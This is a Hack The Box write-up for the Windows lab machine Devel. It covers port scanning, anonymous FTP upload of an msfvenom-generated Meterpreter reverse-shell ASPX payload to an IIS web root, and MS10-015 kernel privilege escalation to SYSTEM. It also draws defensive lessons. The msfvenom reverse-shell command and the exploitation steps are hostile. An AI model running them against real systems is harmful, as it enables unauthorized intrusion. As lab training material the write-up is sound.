# Hack The Box - Devel Writeup

> A complete walkthrough of the **Devel** machine from Hack The Box, covering FTP enumeration, anonymous authentication, IIS web exploitation through file upload, reverse shell access, Windows enumeration, and kernel-based privilege escalation.

---

## Machine Information

| Platform     | Machine | Difficulty | OS      |
| ------------ | ------- | ---------- | ------- |
| Hack The Box | Devel   | Easy       | Windows |

---

# 📌 Overview

**Devel** is an Easy-rated Windows machine from Hack The Box that focuses on understanding how insecure service configurations can lead to initial access and how outdated operating systems can expose privilege escalation opportunities.

The machine exposes two primary services:

* FTP
* HTTP

Enumeration reveals that anonymous FTP access is enabled and that uploaded files are accessible through the IIS web server. This allows an ASPX payload to be uploaded and executed, resulting in an initial shell as the IIS application pool user.

Further enumeration reveals that the target is running an outdated version of Windows 7. Using local privilege escalation enumeration, a vulnerable kernel exploit is identified and successfully used to obtain `NT AUTHORITY\SYSTEM`.

The complete attack path was:

```text
FTP Enumeration
      ↓
Anonymous Login
      ↓
Writable Web Directory
      ↓
Upload ASPX Payload
      ↓
IIS Code Execution
      ↓
Meterpreter Shell
      ↓
Windows Enumeration
      ↓
Local Exploit Discovery
      ↓
Kernel Privilege Escalation
      ↓
NT AUTHORITY\SYSTEM
```

---

# 🗂️ Table of Contents

* [Reconnaissance](#-reconnaissance)
* [Full Port Scan](#-full-port-scan)
* [Service Enumeration](#-service-enumeration)
* [FTP Enumeration](#-ftp-enumeration)
* [Anonymous FTP Access](#-anonymous-ftp-access)
* [Initial Access](#-initial-access)
* [ASPX Payload Upload](#-aspx-payload-upload)
* [Reverse Shell](#-reverse-shell)
* [System Enumeration](#-system-enumeration)
* [Privilege Escalation](#-privilege-escalation)
* [User Flag](#-user-flag)
* [Root Flag](#-root-flag)
* [Attack Path Summary](#-attack-path-summary)
* [Key Takeaways](#-key-takeaways)

---

# 🔍 Reconnaissance

The target IP address provided was:

```text
10.129.76.138
```

The first step was to perform port enumeration.

---

# 🔎 Full Port Scan

Starting with an Nmap scan to identify the available services.

```bash
nmap -p- --min-rate 5000 10.129.76.138
```

### Results

```text
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http
```

Only two ports were initially discovered:

| Port | Service |
| ---- | ------- |
| 21   | FTP     |
| 80   | HTTP    |

While continuing enumeration, a complete port scan was kept running in the background to ensure no additional services were missed.

The combination of FTP and HTTP immediately suggested an interesting possibility: checking whether files uploaded through FTP could potentially be served by the web server.

---

# 🔬 Service Enumeration

A detailed service and version detection scan was performed.

```bash
nmap -sC -sV -p21,80 10.129.76.138
```

### Results

```text
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst:
|_  SYST: Windows_NT

80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
```

The scan revealed several important pieces of information:

```text
Microsoft FTP Server
Anonymous FTP Login Enabled
Windows_NT
Microsoft IIS 7.5
```

The most important finding was:

> **Anonymous FTP authentication was enabled.**

This immediately became the primary attack vector.

---

# 📁 FTP Enumeration

Connecting to the FTP service:

```bash
ftp 10.129.76.138
```

Anonymous authentication was accepted.

Listing the available files:

```bash
ls -lah
```

Output:

```text
229 Entering Extended Passive Mode
125 Data connection already open; Transfer starting.

03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png

226 Transfer complete.
```

The files available through FTP corresponded to the default files served by the IIS web server.

This indicated an important relationship:

```text
FTP Writable Directory
        │
        ▼
Same Directory
        │
        ▼
IIS Web Root
```

If files could be uploaded through FTP, there was a possibility that they could be accessed and executed through the web server.

---

# 🔓 Anonymous FTP Access

Anonymous access allowed interaction with the FTP server.

The next step was to test whether files could be uploaded.

Since the target was running:

```text
Microsoft IIS 7.5
```

an ASPX payload was selected.

ASPX files can be executed by IIS when ASP.NET functionality is enabled.

This provided a potential path for remote code execution.

---

# 💣 ASPX Payload Generation

A Meterpreter reverse shell payload was generated using `msfvenom`.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.95 LPORT=4444 -f aspx > devel.aspx
```

The payload was saved as:

```text
devel.aspx
```

---

# 📤 Uploading the Payload

The generated ASPX payload was uploaded to the FTP server.

```text
ftp> put devel.aspx
```

Output:

```text
local: devel.aspx remote: devel.aspx
```

Since the FTP directory was associated with the IIS web root, the uploaded payload could now potentially be accessed through:

```text
http://10.129.76.138/devel.aspx
```

---

# 🐚 Reverse Shell

A Metasploit multi-handler was configured to receive the reverse connection.

After starting the listener, the uploaded ASPX payload was accessed through the IIS web server.

A Meterpreter session was successfully received.

```text
[*] Sending stage to 10.129.76.138

[*] Meterpreter session 1 opened
```

Checking the available sessions:

```text
sessions
```

Output:

```text
Active sessions
===============

Id  Name  Type                     Information
--  ----  ----                     -----------
1         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL
2         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL
```

The initial shell was running as:

```text
IIS APPPOOL\Web
```

This confirmed successful remote code execution through the uploaded ASPX payload.

---

# 💻 System Enumeration

The first Meterpreter session was selected.

```text
sessions -i 1
```

Checking system information:

```text
sysinfo
```

Output:

```text
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600)
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
```

The important information was:

```text
Windows 7
Build 7600
Architecture: x86
```

The operating system was outdated and therefore became a strong candidate for local privilege escalation.

---

# ⬆️ Privilege Escalation

To identify potential local privilege escalation vectors, Metasploit's Local Exploit Suggester was used.

```text
use post/multi/recon/local_exploit_suggester
```

Then:

```text
run
```

The module checked available local exploits against the target.

Several potential vulnerabilities were identified.

Among the results was:

```text
exploit/windows/local/ms10_015_kitrap0d
```

The target appeared to be a potential candidate for this local privilege escalation exploit.

---

# 💥 MS10-015 Privilege Escalation

The following exploit was selected:

```text
exploit/windows/local/ms10_015_kitrap0d
```

After configuring the exploit with the existing Meterpreter session, the exploit was executed.

A new Meterpreter session was opened.

Connecting to the new session:

```text
sessions -i 3
```

Checking the current privileges:

```text
getuid
```

Output:

```text
Server username: NT AUTHORITY\SYSTEM
```

Privilege escalation was successful.

We now had the highest privilege level available on the Windows system.

---

# 🚩 User Flag

With elevated access, the user directories were enumerated.

The user flag was located at:

```text
C:\Users\babis\Desktop\user.txt
```

Listing the directory:

```text
C:\Users\babis\Desktop
```

Output:

```text
Mode              Size  Type  Name
----              ----  ----  ----
100666/rw-rw-rw-  282   fil   desktop.ini
100444/r--r--r--  34    fil   user.txt
```

The user flag was read using:

```text
cat user.txt
```

---

# 👑 Root Flag

The root flag was located on the Administrator desktop.

```text
C:\Users\Administrator\Desktop\root.txt
```

Listing the directory:

```text
Desktop
=======================================

Mode              Size  Type  Name
----              ----  ----  ----
100666/rw-rw-rw-  282   fil   desktop.ini
100444/r--r--r--  34    fil   root.txt
```

The root flag was read using:

```text
cat root.txt
```

The machine was successfully compromised with:

```text
NT AUTHORITY\SYSTEM
```

privileges.

---

# 🗺️ Attack Path Summary

```text
┌──────────────────────────────┐
│         Nmap Scan            │
│                              │
│ 21 - FTP                     │
│ 80 - HTTP                    │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      FTP Enumeration         │
│                              │
│ Anonymous Login Enabled      │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Writable FTP Share      │
│                              │
│ Connected to IIS Web Root    │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      Upload ASPX Payload     │
│                              │
│ Meterpreter Reverse Shell    │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      IIS APPPOOL\Web         │
│                              │
│      Initial Foothold        │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      System Enumeration      │
│                              │
│ Windows 7 Build 7600         │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│   Local Exploit Suggester    │
│                              │
│ Identify Potential Exploits  │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│        MS10-015              │
│                              │
│ Kernel Privilege Escalation  │
└──────────────┬───────────────┘
               │
               ▼
┌──────────────────────────────┐
│      NT AUTHORITY\SYSTEM     │
│                              │
│       Full Compromise        │
└──────────────────────────────┘
```

---

# 🔗 Complete Attack Chain

```text
Nmap Enumeration
       │
       ▼
FTP + HTTP
       │
       ▼
Anonymous FTP Login
       │
       ▼
Writable FTP Directory
       │
       ▼
IIS Web Root
       │
       ▼
Upload ASPX Payload
       │
       ▼
Execute Through IIS
       │
       ▼
Meterpreter Shell
       │
       ▼
IIS APPPOOL\Web
       │
       ▼
Windows 7 Enumeration
       │
       ▼
Local Exploit Suggester
       │
       ▼
MS10-015
       │
       ▼
NT AUTHORITY\SYSTEM
```

---

# 🧠 Key Takeaways

## 🔹 Anonymous FTP Can Be Dangerous

Anonymous FTP access by itself does not necessarily result in system compromise.

However, the risk increases significantly when the FTP directory is connected to another service.

In this case:

```text
Anonymous FTP Write Access
           +
IIS Web Root Access
           +
Executable ASPX Files
           =
Remote Code Execution
```

Always investigate whether uploaded files can be accessed through other services.

---

## 🔹 Understand Service Relationships

One of the most important discoveries was the relationship between:

```text
FTP
 ↓
File Upload
 ↓
IIS Web Directory
 ↓
Code Execution
```

Services should not always be analyzed independently.

A vulnerability may exist because of how multiple services are configured together.

---

## 🔹 File Upload Can Become Code Execution

The ability to upload files becomes critical when:

* The upload directory is web accessible
* Executable file extensions are allowed
* Server-side scripting is enabled
* Uploaded files are not validated

Proper file upload restrictions are essential.

---

## 🔹 Initial Access Is Not the End

The initial shell was obtained as:

```text
IIS APPPOOL\Web
```

This account had limited privileges.

Post-exploitation enumeration was required to understand:

* Operating system version
* Architecture
* Patch level
* Available privilege escalation vectors

The target was identified as:

```text
Windows 7
Build 7600
x86
```

This information helped narrow down potential privilege escalation paths.

---

## 🔹 Outdated Operating Systems Increase Risk

The target was running an old Windows build.

Older operating systems can expose vulnerabilities that have been patched in modern versions.

The privilege escalation path demonstrated:

```text
Limited Web User
        ↓
Local Kernel Vulnerability
        ↓
SYSTEM Privileges
```

Regular patching and operating system upgrades are critical security practices.

---

# 🛠️ Tools Used

```text
Nmap
FTP
Metasploit Framework
MSFVenom
Meterpreter
Local Exploit Suggester
Windows Enumeration Commands
```

---

# 📚 Vulnerabilities and Misconfigurations

| Finding                | Component        | Impact                     |
| ---------------------- | ---------------- | -------------------------- |
| Anonymous FTP Access   | Microsoft FTP    | Unauthorized File Access   |
| Writable FTP Directory | FTP              | Arbitrary File Upload      |
| Web Accessible Uploads | IIS              | Remote Code Execution      |
| Outdated Windows 7     | Operating System | Local Privilege Escalation |
| MS10-015               | Windows Kernel   | SYSTEM Privileges          |

---

# 🎯 Lessons Learned

Devel demonstrates how a complete compromise can result from combining insecure service configuration with an outdated operating system.

```text
Anonymous FTP
       +
Writable Directory
       +
Web Accessible Upload
       +
ASPX Execution
       +
Outdated Windows
       +
Kernel Exploit
       =
Complete System Compromise
```

The machine reinforces several important penetration testing principles:

1. Always enumerate all exposed services.
2. Test anonymous authentication carefully.
3. Investigate whether uploaded files are accessible elsewhere.
4. Understand relationships between services.
5. Identify the exact operating system and architecture.
6. Perform proper post-exploitation enumeration.
7. Use privilege escalation enumeration tools as guidance.
8. Verify potential exploits before relying on them.
9. Outdated operating systems significantly increase attack surface.

---

# 🏁 Final Notes

Hack The Box **Devel** is an excellent beginner-friendly Windows machine for understanding the transition from initial access to privilege escalation.

The complete attack path was straightforward but demonstrates several fundamental concepts:

```text
Service Enumeration
        ↓
Anonymous FTP Access
        ↓
File Upload
        ↓
IIS Code Execution
        ↓
Initial Shell
        ↓
Windows Enumeration
        ↓
Kernel Privilege Escalation
        ↓
SYSTEM
```

The most important lesson from this machine is:

> **Individual services may appear secure when analyzed separately, but insecure interactions between services can create a complete compromise path.**

---

## ⚠️ Disclaimer

This writeup is created strictly for educational purposes and documents techniques performed against the intentionally vulnerable **Hack The Box Devel** machine in an authorized laboratory environment.

Do not attempt these techniques against systems without explicit authorization.

---

<p align="center">
  <b>Happy Hacking!</b>
</p>
